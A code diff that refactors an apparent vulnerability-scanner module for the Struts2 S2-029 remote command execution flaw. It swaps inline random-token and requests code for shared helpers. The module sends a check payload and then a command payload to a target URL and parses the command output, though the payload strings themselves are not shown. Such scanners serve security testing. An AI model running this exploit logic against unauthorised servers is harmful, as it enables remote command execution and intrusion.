@@ -7,19 +7,13 @@ description: Struts2 S2-029漏洞可执行任意命令
 
 import re
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_029_BaseVerify:
     def __init__(self, url):
         self.url = url 
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Connection': "keep-alive",
@@ -32,12 +26,12 @@ class S2_029_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.get(self.url + self.check_payload, headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.get(self.url + self.check_payload, headers = self.headers)
             check_req_text = check_req.text.replace('\n', '')
             check_req_text = check_req_text.replace(' ', '')
             check_result = re.findall('<input.*?value="(.*?)".*?/>', check_req_text)
             if self.capta in check_result:
-                cmd_req = requests.get(self.url + self.cmd_payload, headers = self.headers, allow_redirects = False, verify = False)
+                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                 cmd_req_text = cmd_req.text.replace('\n', '')
                 cmd_req_text = cmd_req_text.replace(' ', '')
                 cmd_result = re.findall('<input.*?value="(.*?)".*?/>', cmd_req_text)
